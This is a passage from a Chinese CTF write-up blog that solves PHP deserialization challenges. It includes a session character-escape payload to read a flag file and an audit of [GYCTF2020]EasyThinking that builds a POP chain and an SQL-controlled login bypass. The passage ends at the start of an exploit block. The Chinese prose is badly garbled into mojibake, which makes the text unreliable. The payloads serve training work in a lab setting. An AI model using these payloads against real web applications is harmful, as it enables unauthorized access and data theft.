å¯†ï¼Œæ˜¯ä¸€ä¸ªä¸å¯é€†çš„æ“ä½œã€‚</p><p>é‚£ä¹ˆå†å»çœ‹å¦å¤–ä¸¤ä¸ªå‚æ•°<code>function</code>å’Œ<code>user</code>ï¼Œå…¶ä¸­<code>user</code>ä¹Ÿæ˜¯ç¡¬ç¼–ç æ— æ³•åˆ©ç”¨ï¼Œåªèƒ½ä»<code>function</code>å‚æ•°å…¥æ‰‹ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜è¦æ³¨æ„åˆ°æœ‰ä¸€ä¸ª<code>filter</code>å‡½æ•°ç”¨äºè¿‡æ»¤<code>php</code>ã€<code>flag</code>ã€<code>php5</code>ã€<code>php4</code>å’Œ<code>fl1g</code>å…³é”®å­—ã€‚</p><blockquote><p>ä»»ä½•å…·æœ‰ä¸€å®šç»“æ„çš„æ•°æ®ï¼Œ<strong>å¦‚æœç»è¿‡äº†æŸäº›å¤„ç†è€ŒæŠŠç»“æ„ä½“æœ¬èº«çš„ç»“æ„ç»™æ‰“ä¹±äº†</strong>ï¼Œåˆ™æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ã€‚</p></blockquote><p>é‚£ä¹ˆè¿™ä¸ªåœ°æ–¹å°±å¯ä»¥å¾ˆæ˜æ˜¾çš„ç”¨åˆ°ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„æ¼æ´ï¼Œç”¨äºè¦†ç›–<code>$userinfo['img']</code>å‚æ•°ä¸º<code>d0g3_f1ag.php</code>ã€‚é¦–å…ˆçœ‹ä¸€ä¸‹ä¸€ä¸ªæ­£å¸¸çš„åºåˆ—åŒ–åçš„<code>$_SESSION</code>æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">php &gt; $_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">php &gt; $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">php &gt; print_r(serialize($_SESSION));</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦è¦†ç›–æ‰åºåˆ—åŒ–åçš„<code>img</code>å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¦æ’å…¥<code>s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>ï¼Œå³</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–æ¼æ´æ¥è¦†ç›–<code>$_SESSION[&quot;user&quot;]</code>å’Œ<code>$_SESSION[&quot;function&quot;]</code>çš„å€¼ã€‚</p><p>å‡å¦‚æˆ‘ä»¬èµ‹å€¼<code>$_SESSION[&quot;user&quot;]=flagflagflagflagflagflag</code>ï¼Œ<code>$_SESSION[&quot;function&quot;]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</code>ï¼Œé‚£ä¹ˆåºåˆ—åŒ–å<code>$serialize_info</code>ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:28:&quot;</span>L3VwbG9hZC9ndWVzdF9pbWcuanBn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ä¹‹åï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:28:&quot;</span>L3VwbG9hZC9ndWVzdF9pbWcuanBn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>åˆšå¥½æ˜¯24ä¸ªå­—ç¬¦ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶åé¢çš„åºåˆ—åŒ–å†…å®¹ã€‚</p><p>æ‰€ä»¥æœ€ç»ˆçš„payloadä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ-v3">å‚è€ƒ</h3><p><a href="https://xz.aliyun.com/t/6911#toc-3">å®˜æ–¹writeup</a></p><p><a href="https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">ADæ”»é˜²å®éªŒå®¤â€”â€”PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</a></p><h2 id="GYCTF2020-EasyThinking">[GYCTF2020]EasyThinking</h2><h3 id="è€ƒç‚¹-v11">è€ƒç‚¹</h3><ul><li>POPé“¾æ„é€ </li><li>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</li></ul><h3 id="è§£é¢˜-v11">è§£é¢˜</h3><p>ä¸‹è½½<code>www.zip</code>å®¡è®¡æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>update.php</code>é¡µé¢æç¤ºéœ€è¦ç™»å½•æ‰èƒ½è·å¾—flagã€‚</p><p>ä¸»è¦ä»£ç éƒ½åœ¨<code>lib.php</code>ä¸­ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹Userç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ çš„IDæ˜¯&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ å¥½ï¼&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//å±</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>login</code>å‡½æ•°ä¸­è°ƒç”¨<code>dbCtrl</code>ç±»ä¸­çš„<code>login</code>å‡½æ•°æ‰§è¡ŒSQLè¯­å¥ï¼Œ<code>update</code>å‡½æ•°ä¸­æœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„åœ°æ–¹ï¼Œå‚æ•°æ˜¯<code>getNewInfo</code>å‡½æ•°çš„è¿”å›å€¼ã€‚</p><p><code>getNewInfo</code>å‡½æ•°ä¸­<code>age</code>å’Œ<code>nickname</code>å‚æ•°æ˜¯å¯æ§çš„ï¼Œä¼ ç»™äº†<code>Info</code>ç±»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age&#x3D;$age;</span><br><span class="line">        $this-&gt;nickname&#x3D;$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿˜è¦ç»è¿‡ä¸€æ¬¡<code>safe</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ›¿æ¢ä¹‹åæ”¹å˜äº†æ•°æ®çš„ç»“æ„ï¼Œç±»ä¼¼0CTF2016 piapiapiaè¿™é“é¢˜ï¼Œå¾ˆå¯èƒ½ä¼šå¼•å‘å­—ç¬¦é€ƒé€¸çš„æ¼æ´ã€‚</p><p>æ¥ç€çœ‹<code>dbCtrl</code>ç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è¿˜æ²¡æ¥å¾—åŠå†™</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“çš„ä¿¡æ¯:</p><ol><li>ç”¨æˆ·åå­˜åœ¨ï¼Œä¸”$this-&gt;passwordçš„md5çš„å€¼ä¸æ•°æ®åº“æŸ¥è¯¢ç”¨æˆ·å¯†ç ç›¸åŒã€‚</li><li>æˆ–è€…tokençš„å€¼ä¸ºadmin</li></ol><p>è¿™é‡Œæœ‰ç‚¹åƒ2019GXYCTFä¸­çš„babySqliï¼Œæ˜¯ä¸æ˜¯æˆ‘ä»¬æ§åˆ¶äº†sqlè¯­å¥ï¼Œä½¿ç”¨</p><ul><li><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></li><li>$this-&gt;password=1(1çš„md5çš„å€¼ä¸ºc4ca4238a0b923820dcc509a6f75849b)</li></ul><p>å°±å¯ä»¥é€šè¿‡ç™»å½•å¯†ç çš„éªŒè¯ã€‚</p><p>æ¥ä¸‹æ¥æ„é€ POPé“¾ï¼Œå…ˆæ¥æ‰¾ä¸€ä¸‹<code>__destruct</code>é­”æ³•æ–¹æ³•ï¼Œåœ¨<code>UpdateHelper</code>ç±»ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ä¼šæŠŠsqlç»™echoå‡ºæ¥ï¼Œå¦‚æœ<code>$sql=new User()</code>çš„è¯ï¼Œå°±ä¼šè§¦å‘Userå†…çš„__toString()é­”æœ¯æ–¹æ³•ï¼Œè¯¥é­”æœ¯æ–¹æ³•å†…è°ƒç”¨äº†<code>$nickname</code>å±æ€§çš„update()æ–¹æ³•ã€‚è™½ç„¶dbCtrlå¯¹è±¡æ‹¥æœ‰update()æ–¹æ³•ï¼Œä½†æ˜¯<code>$nickname</code>å®ä¾‹åŒ–æˆå¯¹è±¡æ²¡æ„ä¹‰ã€‚æ¥ç€çœ‹<code>Info</code>ç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶æˆ‘ä»¬çœ‹åˆ°äº†Infoç±»å†…æœ‰<code>__call()</code>é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœè°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§ï¼Œ<code>__call()</code>æ–¹æ³•å°±ä¼šè§¦å‘ï¼Œæ­£å¥½Infoç±»æ²¡æœ‰update()æ–¹æ³•ï¼Œé‚£ä¹ˆå¦‚æœUserå†…çš„<code>$nickname</code>å®ä¾‹åŒ–ä¸ºInfoå¯¹è±¡ï¼Œè°ƒç”¨ä¸å­˜åœ¨update()å°±ä¼šè§¦å‘è¿™ä¸ª<code>__call()</code>ï¼Œè¿™ä¸ª<code>__call()</code>é­”æœ¯æ–¹æ³•å°†Ctrlcaseçš„login()å‡½æ•°ç»“æœè¾“å‡ºå‡ºæ¥ã€‚</p><p>è¿™æ ·æˆ‘ä»¬åªéœ€è¦<code>$CtrlCase</code>å˜é‡å®ä¾‹åŒ–ä¸ºdbCtrlç±»çš„å¯¹è±¡ï¼Œè¿™å¥è¯ç›¸å½“äºç›¸å½“äº<code>dbCtrl::login($sql)</code>ï¼Œè€Œä¸”å¯çŸ¥<code>dbCtrl::login($sql)</code>ä¸­çš„<code>$sql</code>å‚æ•°ï¼Œå®é™…ä¸Šæ˜¯Userç±»ä¸­çš„$ageå˜é‡ä¼ å…¥çš„ï¼Œå‚æ•°å°±æ˜¯æˆ‘ä»¬æ§åˆ¶çš„äº†ã€‚</p><p>expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 